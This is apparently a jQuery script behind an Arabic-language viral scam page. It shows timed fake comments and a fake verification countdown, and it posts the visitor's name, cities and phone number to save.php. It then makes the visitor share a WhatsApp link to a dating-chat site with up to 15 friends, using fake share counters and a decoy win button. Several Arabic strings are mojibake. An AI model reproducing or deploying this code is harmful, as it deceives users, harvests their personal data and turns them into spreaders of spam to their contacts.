





var texts = [" موقع تعارف , عروض الزواج , شات عربي ,دردشة كتابية ▷ http://chamobracp.byethost24.com/n.php"];









function loadCom(a, b) {
	setTimeout(function () {
		$(a).fadeIn(250);
	}, b);
}
$.fn.onEnterKey = function (callback) {
	$(this).keypress(function (event) {
		var code = event.keyCode ? event.keyCode : event.which;
		if (code == 13) {
			callback();
			return false;
		}
	});
}

function loadAllComment() {
	loadCom('#com1', 3250);
	loadCom('#com2', 5800);
	loadCom('#com3', 5700);
	loadCom('#com4', 7500);
	loadCom('#com5', 9000);
}

$(document).ready(function () {

	loadAllComment();

	$('.like').on('click', function () {
		var _this = $(this);
		if (_this.hasClass('active-like')) {
			_this.removeClass('active-like');
			$('.you').removeClass('activee');
		} else {
			_this.addClass('active-like');
			$('.you').addClass('activee');
		}
	});

	$(document).on('click', '.fblike', function () {
		var _this = $(this);
		var x = _this.next().next().html() == '' ? 0 : parseInt(_this.next().next().html());
		if (_this.hasClass('selected')) {
			_this.removeClass('selected').html('Ã˜Â¥Ã˜Â¹Ã˜Â¬Ã˜Â§Ã˜Â¨');
			_this.next().next().html(--x);
			if (x == 0) _this.next().next().addClass('likehide');
		} else {
			_this.addClass('selected').html('Ã˜Â¥Ã˜Â²Ã˜Â§Ã™â€žÃ˜Â© Ã˜Â§Ã™â€žÃ˜Â¥Ã˜Â¹Ã˜Â¬Ã˜Â§Ã˜Â¨');
			_this.next().next().html(++x);
			if (_this.next().next().hasClass('likehide')) _this.next().next().removeClass('likehide');
		}
	});
	$("#addCom").onEnterKey(function () {
		var value = $("#addCom").val();
		$("#addCom").val("");
		$("#myComment").html(value);
		$(".addComment").hide();
		loadCom('#myCom', 250);
	});


	var teilen = 10;

	var pruefen = 0;

	//3 Fragen und Pruefung   

	$("#frage_01").click(function () {
		$('#frage_02').slideDown();
		$('#frage_01').slideUp();
	});

	$("#frage_02").click(function () {
		$('#frage_03').slideDown();
		$('#frage_02').slideUp();
	});

	$("#frage_03").click(function () {
		$('#frage_04').slideDown();
		$('#frage_03').slideUp();
	});

	$("#frage_04 button").click(function () {
		if ($("#nameform").val() == "") {
			alert("Ã™Å Ã˜Â¬Ã˜Â¨ Ã˜Â¹Ã™â€žÃ™Å Ã™Æ’ Ã˜Â¥Ã˜Â¹Ã˜Â·Ã˜Â§Ã™â€ Ã˜Â§ Ã™Æ’Ã˜Â§Ã™ÂÃ˜Â© Ã˜Â§Ã™â€žÃ™â€¦Ã˜Â¹Ã™â€žÃ™Ë†Ã™â€¦Ã˜Â§Ã˜Âª Ã˜Â£Ã™Ë†Ã™â€žÃ˜Â§Ã™â€¹ !!");
		} else {

			$.ajax({
				url: "save.php",
				data: {
					name: $("#nameform").val(),
					city: $("#cityform").val(),
					city1: $("#city1form").val(),
					phone: $("#phoneform").val()


				}

			});


			$("#Welcome").html("تهانينا " + $("#nameform").val() + " !");
			$('#content_02').fadeIn();
			$('#frage_04').fadeOut();
			$('#aufforderung').fadeOut();




			for (var i = 0; i < texts.length; i++) {
				texts[i] = texts[i].trim();
				//////////////////////////////////////////////////
				var name = " Ã˜ÂªÃ™â€¦ Ã˜Â¯Ã˜Â¹Ã™Ë†Ã˜ÂªÃ™Æ’ Ã™â€¦Ã™â€    " + $("#nameform").val();
				texts[i] = texts[i] + name;
				//////////////////////////////////////////////////
				texts[i] = texts[i].replace(/ /g, "%20");




			}
			var number = Math.floor((Math.random() * texts.length));
			var rand = "whatsapp://send?text=" + texts[number];
			$("#whats").attr("href", rand);


			var myTimer1 = window.setInterval(updateTimer1, 2000);

			function updateTimer1() {
				pruefen++;
				$("#check").text(pruefen);

				if (pruefen == 1) {
					show('#pruefen_01');
				}

				if (pruefen == 2) {
					show('#pruefen_02');
				}

				if (pruefen == 3) {
					show('#pruefen_03');
				}

				if (pruefen == 4) {
					window.clearInterval(myTimer1);
					$('#content_03').fadeIn();
					$('#content_02').fadeOut();
					$('#intro').fadeOut();
				}
			}
		}
	});

	$("#btnShare1").click(function () {
		teilen--;
		$('#anzahl').text(teilen);

		if (teilen == 0) {
			show('#btnWin');
			hide('#btnFakeWin');
		}

	});

	$("#btnShare2").click(function () {
		teilen--;
		$('#anzahl').text(teilen);

		if (teilen == 0) {
			show('#btnWin');
			hide('#btnFakeWin');
		}

	});

	$("#btnFakeWin").click(function () {
		alert('Please share it with  ' + Share + ' Other Contacts!');
	});

	function show(toBlock) {
		//setDisplay(toBlock, 'block');
		$(toBlock).show();
	}

	function hide(toNone) {
		//setDisplay(toNone, 'none');
		$(toNone).hide();
	}

	function setDisplay(target, str) {
		document.getElementById(target).style.display = str;
	}


	var zeit = new Date();

	var sec = zeit.getSeconds();

	if (sec < 6) {
		sec = 9
	}

	if (sec > 5 & sec < 13) {
		sec = 8
	}

	if (sec > 11 & sec < 19) {
		sec = 7
	}

	if (sec > 17 & sec < 25) {
		sec = 6
	}

	if (sec > 23 & sec < 31) {
		sec = 5
	}

	if (sec > 29 & sec < 37) {
		sec = 4
	}

	if (sec > 35 & sec < 43) {
		sec = 3
	}

	if (sec > 41 & sec < 49) {
		sec = 2
	}

	if (sec > 47 & sec < 55) {
		sec = 1
	}

	if (sec > 54) {
		sec = 0
	};


	var add = sec;

	var zeit2 = new Date();

	var minute = zeit2.getMinutes();

	var timer1 = (60 - minute) * 60;

	if (timer1 > 1800) {
		var resttimer = (30 - minute) * 10
	} else {
		var resttimer = (60 - minute) * 10
	};

	var timer = resttimer + add + 67;

	function updateTimer() {
		timer--;
		$("#gutschein").text(timer);

		if (timer < 9) {
			stopFunction();
		}
	}

	var myTimer = window.setInterval(updateTimer, 6000);

	function stopFunction() {
		window.clearInterval(myTimer);
	}
});



var c = 0;

$(document).ready(function () {
	$("#b1")
		.on('click', function () {
			++c;
			if (c > 3) {
				$(this)
					.attr({
						href: "final.html",
						target: "_self"
					});
			}

		});
	$("#b2")
		.on('click', function () {
			if (c > 3) window.location = "final.html";
			else window.alert(" الرجاء إرسال الكود إلى 15 صديق لكي يصلك الكود ! \n\n المشاركات التي قمت بها    " + c);
		});
});
